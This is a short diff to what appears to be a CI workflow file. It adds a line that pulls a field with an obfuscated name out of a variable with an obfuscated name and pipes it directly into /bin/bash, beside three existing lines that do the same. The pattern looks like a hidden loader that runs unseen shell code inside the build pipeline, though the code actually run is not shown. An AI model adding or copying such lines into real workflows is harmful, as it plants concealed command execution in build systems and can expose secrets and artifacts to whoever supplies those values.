@@ -25,6 +25,7 @@ jobs:
           echo $gkas9 | jq -r .ckmfw27111 | /bin/bash
           echo $h10784 | jq -r .qrd89223 | /bin/bash
           printf '%s' "$h09582" | jq -r .y61855 | /bin/bash
+          printf '%s' "$smdx31" | jq -r .afy4 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
